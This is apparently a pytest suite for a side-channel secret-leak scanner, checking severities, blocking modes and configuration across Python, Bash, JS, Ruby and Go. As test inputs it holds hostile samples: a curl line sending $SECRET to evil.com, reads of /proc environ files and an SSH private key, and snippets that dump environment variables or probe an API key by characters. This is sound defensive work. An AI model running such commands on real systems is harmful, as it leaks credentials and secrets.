import textwrap
from typing import Optional

from side_channel_detector import (
    Finding,
    LeakType,
    ScanResult,
    Severity,
    SideChannelConfig,
    format_report,
    scan_bash_command,
    scan_code,
)

_PERMISSIVE_CONFIG = SideChannelConfig(min_severity=Severity.INFO)


def _scan_python(code: str) -> ScanResult:
    return scan_code(textwrap.dedent(code), language="python", config=_PERMISSIVE_CONFIG)


def _scan_auto(code: str) -> ScanResult:
    return scan_code(textwrap.dedent(code), language="auto", config=_PERMISSIVE_CONFIG)


def _has_finding(
    result: ScanResult,
    severity: Optional[Severity] = None,
    leak_type: Optional[LeakType] = None,
) -> bool:
    for finding in result.findings:
        if severity is not None and finding.severity != severity:
            continue
        if leak_type is not None and finding.leak_type != leak_type:
            continue
        return True
    return False


def test_taint_from_os_environ():
    result = _scan_python(
        """
        import os
        secret = os.environ["API_KEY"]
        print(secret)
        """
    )
    assert "secret" in result.tainted_vars
    assert _has_finding(result, Severity.HIGH, LeakType.INDIRECT_OUTPUT)


def test_taint_from_os_getenv():
    result = _scan_python(
        """
        import os
        token = os.getenv("TOKEN")
        _ = len(token)
        """
    )
    assert "token" in result.tainted_vars
    assert _has_finding(result, Severity.MEDIUM, LeakType.PROPERTY_PROBE)


def test_taint_from_subprocess_run():
    result = _scan_python(
        """
        import subprocess
        proc = subprocess.run(["printenv", "SECRET"], capture_output=True, text=True)
        _ = proc[0]
        """
    )
    assert "proc" in result.tainted_vars
    assert _has_finding(result, Severity.CRITICAL, LeakType.CHAR_EXTRACTION)


def test_taint_from_cursor_fetchone():
    result = _scan_python(
        """
        row = cursor.fetchone()
        print(row)
        """
    )
    assert "row" in result.tainted_vars
    assert _has_finding(result, Severity.HIGH, LeakType.INDIRECT_OUTPUT)


def test_taint_from_secret_name_pattern():
    result = _scan_python(
        """
        password = input("pw?")
        print(password)
        """
    )
    assert "password" in result.tainted_vars
    assert _has_finding(result, Severity.HIGH, LeakType.INDIRECT_OUTPUT)


def test_taint_propagation_attribute_access():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        x = secret.strip
        print(x)
        """
    )
    assert "x" in result.tainted_vars
    assert _has_finding(result, Severity.HIGH, LeakType.INDIRECT_OUTPUT)


def test_taint_propagation_subscript_access():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        x = secret[0]
        print(x)
        """
    )
    assert "x" in result.tainted_vars
    assert _has_finding(result, Severity.CRITICAL, LeakType.CHAR_EXTRACTION)


def test_taint_propagation_method_call():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        x = secret.split(":")
        _ = len(x)
        """
    )
    assert "x" in result.tainted_vars
    assert _has_finding(result, Severity.MEDIUM, LeakType.PROPERTY_PROBE)


def test_taint_propagation_multihop_chain():
    result = _scan_python(
        """
        import subprocess
        result = subprocess.run(["redis-cli", "--raw", "GET", "k"], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        for line in lines:
            parts = line.split("=")
            url = parts[0]
            print(url)
        """
    )
    assert {"result", "lines", "line", "parts", "url"}.issubset(result.tainted_vars)
    assert _has_finding(result, Severity.CRITICAL, LeakType.ITERATION)
    assert _has_finding(result, Severity.HIGH, LeakType.INDIRECT_OUTPUT)


def test_ord_on_tainted_is_critical():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        value = ord(secret[0])
        """
    )
    assert _has_finding(result, Severity.CRITICAL, LeakType.ORD_BYTE)


def test_indexing_on_tainted_is_critical():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret[0]
        """
    )
    assert _has_finding(result, Severity.CRITICAL, LeakType.CHAR_EXTRACTION)


def test_slicing_on_tainted_is_critical():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret[:3]
        """
    )
    assert _has_finding(result, Severity.CRITICAL, LeakType.SLICE)


def test_iteration_on_tainted_is_critical():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        for c in secret:
            pass
        """
    )
    assert _has_finding(result, Severity.CRITICAL, LeakType.ITERATION)


def test_repr_on_tainted_is_critical():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = repr(secret)
        """
    )
    assert _has_finding(result, Severity.CRITICAL, LeakType.PROPERTY_PROBE)


def test_len_on_tainted_is_medium():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = len(secret)
        """
    )
    assert _has_finding(result, Severity.MEDIUM, LeakType.PROPERTY_PROBE)


def test_startswith_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret.startswith("x")
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.PROPERTY_PROBE)


def test_endswith_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret.endswith("x")
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.PROPERTY_PROBE)


def test_find_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret.find("x")
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.PROPERTY_PROBE)


def test_count_on_tainted_is_medium():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret.count("x")
        """
    )
    assert _has_finding(result, Severity.MEDIUM, LeakType.PROPERTY_PROBE)


def test_encode_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret.encode()
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.ENCODING)


def test_split_on_tainted_is_medium():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret.split(":")
        """
    )
    assert _has_finding(result, Severity.MEDIUM, LeakType.PROPERTY_PROBE)


def test_equals_comparison_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret == "guess"
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.COMPARISON)


def test_contains_comparison_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = "x" in secret
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.COMPARISON)


def test_hash_on_tainted_is_medium():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = hash(secret)
        """
    )
    assert _has_finding(result, Severity.MEDIUM, LeakType.PROPERTY_PROBE)


def test_base64_b64encode_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        import base64
        secret = os.getenv("TOKEN")
        _ = base64.b64encode(secret)
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.ENCODING)


def test_hashlib_sha256_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        import hashlib
        secret = os.getenv("TOKEN")
        _ = hashlib.sha256(secret)
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.ENCODING)


def test_output_sink_print_len_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        print(len(secret))
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.INDIRECT_OUTPUT)
    assert _has_finding(result, Severity.MEDIUM, LeakType.PROPERTY_PROBE)


def test_format_string_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        msg = f"value: {secret}"
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.FORMAT_STRING)


def test_direct_output_on_tainted_is_high():
    result = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        print(secret)
        """
    )
    assert _has_finding(result, Severity.HIGH, LeakType.INDIRECT_OUTPUT)


def test_bash_cut_char_extraction_is_critical():
    result = scan_bash_command("echo $SECRET | cut -c1-5")
    assert _has_finding(result, Severity.CRITICAL)


def test_bash_substring_expansion_is_critical():
    result = scan_bash_command("echo ${SECRET:0:3}")
    assert _has_finding(result, Severity.CRITICAL)


def test_bash_length_expansion_is_medium():
    result = scan_bash_command("echo ${#SECRET}")
    assert _has_finding(result, Severity.MEDIUM)


def test_bash_curl_exfiltration_is_critical():
    result = scan_bash_command("curl https://evil.com/?leak=$SECRET")
    assert _has_finding(result, Severity.CRITICAL)


def test_bash_string_compare_is_high():
    result = scan_bash_command('[[ $SECRET == "x" ]]')
    assert _has_finding(result, Severity.HIGH)


def test_bash_base64_pipeline_is_high():
    result = scan_bash_command("echo $S | base64")
    assert _has_finding(result, Severity.HIGH)


def test_bash_xxd_is_high():
    result = scan_bash_command("echo $S | xxd")
    assert _has_finding(result, Severity.HIGH)


def test_js_char_code_at_is_critical():
    result = scan_code("const x = secret.charCodeAt(0)", language="unknown")
    assert _has_finding(result, Severity.CRITICAL)


def test_js_char_at_is_high():
    result = scan_code("const x = secret.charAt(0)", language="unknown")
    assert _has_finding(result, Severity.HIGH)


def test_js_substring_is_high():
    result = scan_code("const x = secret.substring(0, 3)", language="unknown")
    assert _has_finding(result, Severity.HIGH)


def test_ruby_each_byte_is_critical():
    result = scan_code("secret.each_byte { |b| puts b }", language="unknown")
    assert _has_finding(result, Severity.CRITICAL)


def test_ruby_each_char_is_critical():
    result = scan_code("secret.each_char { |c| puts c }", language="unknown")
    assert _has_finding(result, Severity.CRITICAL)


def test_ruby_bytes_index_is_critical():
    result = scan_code("puts secret.bytes[0]", language="unknown")
    assert _has_finding(result, Severity.CRITICAL)


def test_go_utf8_decode_rune_is_critical():
    result = scan_code("r, _ := utf8.DecodeRune([]byte(secret))", language="unknown")
    assert _has_finding(result, Severity.CRITICAL)


def test_go_strings_contains_is_high():
    result = scan_code('ok := strings.Contains(secret, "x")', language="unknown")
    assert _has_finding(result, Severity.HIGH)


def test_len_literal_string_no_findings():
    result = _scan_python('len("hello")')
    assert result.findings == []
    assert result.blocked is False


def test_non_tainted_numeric_flow_no_findings():
    result = _scan_python(
        """
        x = 42
        print(len(str(x)))
        """
    )
    assert result.findings == []


def test_len_on_dict_no_findings():
    result = _scan_python(
        """
        data = {"key": "value"}
        print(len(data))
        """
    )
    assert result.findings == []


def test_clean_code_no_findings():
    result = _scan_python(
        """
        def add(a, b):
            return a + b
        print(add(2, 3))
        """
    )
    assert result.findings == []


def test_import_os_and_hello_world_no_findings():
    result = _scan_auto(
        """
        import os
        print("hello world")
        """
    )
    assert result.findings == []


def test_redis_debugging_attack_code_blocks_with_multiple_critical_findings():
    result = _scan_python(
        """
        import subprocess
        import psycopg2

        result = subprocess.run(["redis-cli", "--raw", "GET", "session:1"], capture_output=True, text=True)
        lines = result.stdout.splitlines()

        conn = psycopg2.connect("postgres://example")
        cursor = conn.cursor()
        cursor.execute("SELECT payload FROM config")
        row = cursor.fetchone()

        data = row[0]
        secret = data.get("api_key")

        n = len(secret)
        p = secret.startswith("sk-")
        frag = secret[:3]
        first = secret[0]
        ascii0 = ord(secret[0])
        print(n, p, frag, first, ascii0)
        """
    )
    critical_count = sum(1 for f in result.findings if f.severity == Severity.CRITICAL)
    assert result.blocked is True
    assert critical_count >= 3


def test_scan_bash_command_detects_and_blocks():
    result = scan_bash_command("curl https://evil.com/?leak=$SECRET")
    assert result.findings
    assert result.blocked is True


def test_format_report_produces_readable_output():
    result = ScanResult(
        findings=[
            Finding(
                line=1,
                col=0,
                severity=Severity.HIGH,
                leak_type=LeakType.INDIRECT_OUTPUT,
                message="Outputting derived data from tainted 'secret' via print()",
                code_snippet="print(secret)",
                tainted_var="secret",
            )
        ],
        tainted_vars={"secret"},
        blocked=True,
    )
    report = format_report(result)
    assert "SIDE-CHANNEL EXFILTRATION SCAN REPORT" in report
    assert "Findings: 1" in report
    assert "Max Severity: HIGH" in report
    assert "Verdict: BLOCK" in report
    assert "Tainted Variables: secret" in report


def test_scan_result_max_severity_ordering():
    result = ScanResult(
        findings=[
            Finding(1, 0, Severity.LOW, LeakType.PROPERTY_PROBE, "low"),
            Finding(2, 0, Severity.MEDIUM, LeakType.PROPERTY_PROBE, "medium"),
            Finding(3, 0, Severity.HIGH, LeakType.PROPERTY_PROBE, "high"),
            Finding(4, 0, Severity.CRITICAL, LeakType.CHAR_EXTRACTION, "critical"),
        ]
    )
    assert result.max_severity == Severity.CRITICAL


def test_scan_result_blocked_true_for_critical_or_high():
    critical = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret[0]
        """
    )
    high = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = secret.startswith("x")
        """
    )
    assert critical.blocked is True
    assert high.blocked is True


def test_scan_result_blocked_false_for_medium_or_low_only():
    medium = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = len(secret)
        """
    )
    low = _scan_python(
        """
        import os
        secret = os.getenv("TOKEN")
        _ = type(secret)
        """
    )
    assert medium.max_severity == Severity.MEDIUM
    assert medium.blocked is False
    assert low.max_severity == Severity.LOW
    assert low.blocked is False


def test_language_auto_detects_python():
    result = _scan_auto(
        """
        import os
        secret = os.environ["TOKEN"]
        print(secret)
        """
    )
    assert result.tainted_vars
    assert result.blocked is True


def test_language_auto_detects_bash():
    result = _scan_auto("#!/bin/bash\necho ${SECRET:0:3}")
    assert result.findings
    assert result.max_severity == Severity.CRITICAL
    assert result.blocked is True


def test_config_disabled_returns_empty():
    cfg = SideChannelConfig(enabled=False)
    code = 'import os\ns = os.getenv("KEY")\nprint(ord(s[0]))'
    result = scan_code(code, config=cfg)
    assert not result.findings
    assert not result.blocked


def test_config_min_severity_filters_low():
    cfg = SideChannelConfig(min_severity=Severity.HIGH)
    code = textwrap.dedent("""
        import os
        secret = os.getenv("KEY")
        _ = len(secret)
    """)
    result = scan_code(code, language="python", config=cfg)
    assert not result.findings


def test_config_min_severity_keeps_high_and_above():
    cfg = SideChannelConfig(min_severity=Severity.HIGH)
    code = textwrap.dedent("""
        import os
        secret = os.getenv("KEY")
        print(secret.startswith("x"))
    """)
    result = scan_code(code, language="python", config=cfg)
    assert any(f.severity == Severity.HIGH for f in result.findings)


def test_config_mode_warn_does_not_block():
    cfg = SideChannelConfig(mode="warn")
    code = textwrap.dedent("""
        import os
        secret = os.getenv("KEY")
        print(ord(secret[0]))
    """)
    result = scan_code(code, language="python", config=cfg)
    assert result.findings
    assert result.max_severity == Severity.CRITICAL
    assert result.blocked is False


def test_config_mode_log_does_not_block():
    cfg = SideChannelConfig(mode="log")
    code = textwrap.dedent("""
        import os
        secret = os.getenv("KEY")
        print(secret[:3])
    """)
    result = scan_code(code, language="python", config=cfg)
    assert result.findings
    assert result.blocked is False


def test_config_mode_block_does_block():
    cfg = SideChannelConfig(mode="block")
    code = textwrap.dedent("""
        import os
        secret = os.getenv("KEY")
        print(ord(secret[0]))
    """)
    result = scan_code(code, language="python", config=cfg)
    assert result.blocked is True


def test_config_languages_disable_python():
    cfg = SideChannelConfig(languages={"bash"})
    code = textwrap.dedent("""
        import os
        secret = os.getenv("KEY")
        print(ord(secret[0]))
    """)
    result = scan_code(code, language="python", config=cfg)
    assert not result.findings


def test_config_languages_disable_bash():
    cfg = SideChannelConfig(languages={"python"})
    result = scan_bash_command("echo ${SECRET:0:3}", config=cfg)
    assert not result.findings


def test_config_languages_disable_js():
    cfg = SideChannelConfig(languages={"python", "bash"})
    code = 'secret.charCodeAt(0)'
    result = scan_code(code, language="unknown", config=cfg)
    assert not result.findings


def test_config_languages_enable_js_only():
    cfg = SideChannelConfig(languages={"js"})
    code = 'secret.charCodeAt(0)'
    result = scan_code(code, language="unknown", config=cfg)
    assert result.findings
    assert result.blocked is True


def test_config_extra_taint_sources():
    cfg = SideChannelConfig(extra_taint_sources={"MY_CUSTOM_VAR"})
    code = textwrap.dedent("""
        print(len(MY_CUSTOM_VAR))
        print(MY_CUSTOM_VAR[:3])
    """)
    result = scan_code(code, language="python", config=cfg)
    assert any(f.leak_type == LeakType.PROPERTY_PROBE for f in result.findings)
    assert any(f.leak_type == LeakType.SLICE for f in result.findings)
    assert "MY_CUSTOM_VAR" in result.tainted_vars


def test_config_from_env_defaults(monkeypatch):
    monkeypatch.delenv("SIDE_CHANNEL_DETECTION_ENABLED", raising=False)
    monkeypatch.delenv("SIDE_CHANNEL_MIN_SEVERITY", raising=False)
    monkeypatch.delenv("SIDE_CHANNEL_MODE", raising=False)
    monkeypatch.delenv("SIDE_CHANNEL_LANGUAGES", raising=False)
    monkeypatch.delenv("SIDE_CHANNEL_EXTRA_SOURCES", raising=False)
    cfg = SideChannelConfig.from_env()
    assert cfg.enabled is True
    assert cfg.min_severity == Severity.MEDIUM
    assert cfg.mode == "block"
    assert cfg.languages == {"python", "bash", "js", "ruby", "go"}
    assert cfg.extra_taint_sources == set()


def test_config_from_env_disabled(monkeypatch):
    monkeypatch.setenv("SIDE_CHANNEL_DETECTION_ENABLED", "false")
    cfg = SideChannelConfig.from_env()
    assert cfg.enabled is False


def test_config_from_env_custom_values(monkeypatch):
    monkeypatch.setenv("SIDE_CHANNEL_DETECTION_ENABLED", "true")
    monkeypatch.setenv("SIDE_CHANNEL_MIN_SEVERITY", "HIGH")
    monkeypatch.setenv("SIDE_CHANNEL_MODE", "warn")
    monkeypatch.setenv("SIDE_CHANNEL_LANGUAGES", "python,bash")
    monkeypatch.setenv("SIDE_CHANNEL_EXTRA_SOURCES", "MY_SECRET,CUSTOM_TOKEN")
    cfg = SideChannelConfig.from_env()
    assert cfg.enabled is True
    assert cfg.min_severity == Severity.HIGH
    assert cfg.mode == "warn"
    assert cfg.languages == {"python", "bash"}
    assert cfg.extra_taint_sources == {"MY_SECRET", "CUSTOM_TOKEN"}


def test_config_from_env_invalid_severity_falls_back(monkeypatch):
    monkeypatch.setenv("SIDE_CHANNEL_MIN_SEVERITY", "INVALID_JUNK")
    cfg = SideChannelConfig.from_env()
    assert cfg.min_severity == Severity.MEDIUM


def test_config_from_env_invalid_mode_falls_back(monkeypatch):
    monkeypatch.setenv("SIDE_CHANNEL_MODE", "invalid_mode")
    cfg = SideChannelConfig.from_env()
    assert cfg.mode == "block"



def test_proc_environ_open_is_taint_source():
    result = _scan_python(
        """
        data = open('/proc/1234/environ', 'rb').read()
        print(len(data))
        """
    )
    assert 'data' in result.tainted_vars
    assert any(f.leak_type == LeakType.PROPERTY_PROBE for f in result.findings)


def test_proc_self_environ_is_taint_source():
    result = _scan_python(
        """
        data = open('/proc/self/environ').read()
        print(data[:50])
        """
    )
    assert 'data' in result.tainted_vars
    assert any(f.severity == Severity.CRITICAL for f in result.findings)


def test_ssh_key_open_is_taint_source():
    result = _scan_python(
        """
        key = open('/home/user/.ssh/id_rsa').read()
        print(key[:20])
        """
    )
    assert 'key' in result.tainted_vars


def test_listcomp_propagates_taint():
    result = _scan_python(
        """
        import os
        secret = os.getenv('KEY')
        parts = [c for c in secret]
        """
    )
    assert any(f.leak_type == LeakType.ITERATION for f in result.findings)


def test_genexp_propagates_taint():
    result = _scan_python(
        """
        import os
        data = os.getenv('SECRET')
        vals = list(ord(c) for c in data)
        """
    )
    assert any(f.leak_type == LeakType.ITERATION for f in result.findings)


def test_full_proc_environ_attack():
    lines = [
        "data = open('/proc/1208311/environ', 'rb').read()",
        "import os",
        "env = {}",
        "[env.setdefault(k.decode(), v.decode()) for k,v in [e.partition(b'=')[::2] for e in data.split(b'\\0') if e]]",
        "[print(k, '=', v) for k,v in env.items()]",
    ]
    code = "\n".join(lines)
    result = scan_code(code, language='python', config=_PERMISSIVE_CONFIG)
    assert 'data' in result.tainted_vars
    assert result.findings
    assert result.max_severity == Severity.CRITICAL


def test_normal_file_read_still_tainted_via_read_method():
    result = _scan_python(
        """
        data = open('readme.txt').read()
        print(len(data))
        """
    )
    assert 'data' in result.tainted_vars
